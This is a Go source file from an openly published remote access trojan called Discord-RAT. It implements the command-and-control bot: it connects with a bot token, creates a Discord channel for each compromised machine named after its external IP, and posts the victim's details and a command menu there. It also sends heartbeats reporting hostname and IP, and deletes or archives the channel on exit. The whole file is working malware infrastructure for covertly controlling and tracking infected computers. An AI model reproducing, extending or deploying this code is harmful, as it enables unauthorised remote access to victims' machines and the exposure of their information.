/*
 * This file is part of the Discord-RAT project.
 * Repository: https://github.com/codeuk/discord-rat
 *
 * Written by codeuk (github.com/codeuk)
 *
 * Discord-RAT is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Discord-RAT is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Discord-RAT. If not, see <https://www.gnu.org/licenses/>.
 */
package bot

import (
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"

	"github.com/codeuk/discord-rat/cmd/bot/construct"
	"github.com/codeuk/discord-rat/pkg/agent"
	"github.com/codeuk/discord-rat/pkg/util"
)

// DiscordSession represents the attributes used to handle the agent and its
// respective DiscordGo session and commmand channel.
type DiscordSession struct {
	Agent     *agent.Agent
	Session   *discordgo.Session
	ChannelID *discordgo.Channel
}

var discordBot *DiscordSession

// Init configures and sets up a Discord Session for the passed Agent.
func Init(newAgent *agent.Agent) {
	// Create a Discord session (DiscordGo) with the Bot token.
	discordBot, err := NewDiscordSession(*newAgent)
	if err != nil {
		// Failed to initialize the Bot, therefore we cannot proceed.
		return
	}

	// Add message handler to listen for valid commands.
	discordBot.Session.AddHandler(discordBot.CommandHandler)

	go func() {
		// Send a heartbeat every so often (defined by HEARTBEAT_TIME)
		ticker := time.NewTicker(HEARTBEAT_TIME)
		for {
			<-ticker.C
			go discordBot.SendHeartBeat()
		}
	}()

	// Open a websocket connection to Discord and begin listening.
	if err := discordBot.Session.Open(); err != nil {
		return
	}

	// Wait here until CTRL-C or other term signal is received.
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, syscall.SIGTERM)
	<-sc

	discordBot.CloseAgentChannel()

	// Cleanly close down the Discord session.
	discordBot.Session.Close()
}

// NewDiscordSession configures and returns a new Discord Bot and Session
// for the passed client.
func NewDiscordSession(agent agent.Agent) (*DiscordSession, error) {
	// Create a Discord session (DiscordGo) with the Bot token.
	discordSession, err := discordgo.New("Bot " + util.BotToken)
	if err != nil {
		return nil, err
	}

	// Create a new Discord channel for the Agent based on its external IP.
	channelID, err := discordSession.GuildChannelCreate(util.ServerID, agent.ExternalIP, 0)
	if err != nil {
		return nil, err
	}

	// Construct and send the message containing the newly created Agent's information.
	initEmbed := construct.ConstructNewAgentEmbed(agent)
	if initMessage, err := discordSession.ChannelMessageSendEmbed(channelID.ID, initEmbed); err == nil {
		// Pin the previously send message message.
		discordSession.ChannelMessagePin(channelID.ID, initMessage.ID)
	}

	// Construct and send the message contaning the commands for the Bot.
	menuEmbed := construct.ConstructMenuEmbed()
	discordSession.ChannelMessageSendEmbed(channelID.ID, menuEmbed)

	// Return the custom DiscordSession.
	return &DiscordSession{
		Agent:     &agent,
		Session:   discordSession,
		ChannelID: channelID,
	}, nil
}

// SendCommandMenu sends the Menu embed message containing the Bots commands and their descriptions.
func (discordBot *DiscordSession) SendCommandMenu() {
	// Construct and send the embed.
	_, err := discordBot.Session.ChannelMessageSendEmbed(discordBot.ChannelID.ID, construct.ConstructMenuEmbed())
	if err != nil {
		fmt.Println(err)
	}
}

// CloseAgentChannel exits the agents command channel by deleting or archiving it.
func (discordBot *DiscordSession) CloseAgentChannel() {
	if util.DeleteOnExit {
		// Delete the channel if configurated to.
		discordBot.Session.ChannelDelete(discordBot.ChannelID.ID)
	} else {
		// Rename the channel to 'archive-{agent-ip}' to stop future conflict.
		newChannelName := fmt.Sprintf("archive-%s", discordBot.Agent.ExternalIP)
		discordBot.Session.ChannelEdit(discordBot.ChannelID.ID, newChannelName)
	}
}

// SendHeartBeat sends a heartbeat message to make sure there is no bot timeout.
func (discordBot *DiscordSession) SendHeartBeat() {
	heartBeatMsg := fmt.Sprintf("**[%v@%v]** :anatomical_heart: Heartbeat...", discordBot.Agent.HostName, discordBot.Agent.ExternalIP)

	// Send the heartbeat message.
	discordBot.Session.ChannelMessageSend(discordBot.ChannelID.ID, heartBeatMsg)
}

// How often to send a heartbeat message to the channel (Default: 5 minutes).
const HEARTBEAT_TIME = time.Duration(5) * time.Minute
